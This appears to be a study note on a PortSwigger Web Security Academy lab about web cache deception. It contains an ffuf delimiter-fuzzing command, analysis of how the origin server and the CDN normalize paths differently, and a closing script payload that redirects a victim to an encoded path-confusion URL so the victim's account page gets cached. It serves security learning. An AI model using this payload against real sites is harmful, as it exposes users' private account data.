https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-cache-server-normalization
#### Identify delimiters
- Identify origin server endpoint
- Identify delimiters used by the origin server endpoints
```sh
ffuf -u "https://0a9900050370e7e180c6035c00be0043.web-security-academy.net/my-accountFUZZasd" -w wordlist/delimiters.txt -mc "all" -fc 404 -replay-proxy http://127.0.0.1:8080
```
![[Pasted image 20250405105604.png]]

- Identify cachable endpoints
- Identify delimiters used by the cdn
![[Pasted image 20250405111008.png]]
- The fragment is utilized by the origin server but in the cdn is denied
- The origin server utilizes `/` and also it's normalizing.

#### What we got?
- Origin server normalize before mapping
- Origin server utilizes 2 (or 4 plus the url encoded version) delimiters that the cdn not
#### So?
- if the cdn normalize before mapping we coud **cache arbitrary files**
	`GET /resources/labheader/images/%6cogoAcademy.svg` -> 200
#### Now we know
- this means the cdn server it's normalizing 
- (origin server do normalize too, but will ignore everything after its delimiters)
- origin server utilize # and / as delimiters
- CDN cache file by names
	So we could try:
	GET `/<Dynamic_Resource><Delimiter><Encoded_Dot_Segment><Static_Directory>` 

#### Solution:
we could use hasthag, which is ignored by the browser, however by encoding it we could generate a path confusion and it's ued by the browser
```html
<script>
document.location="https://0a9900050370e7e180c6035c00be0043.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd=true"
</script>
```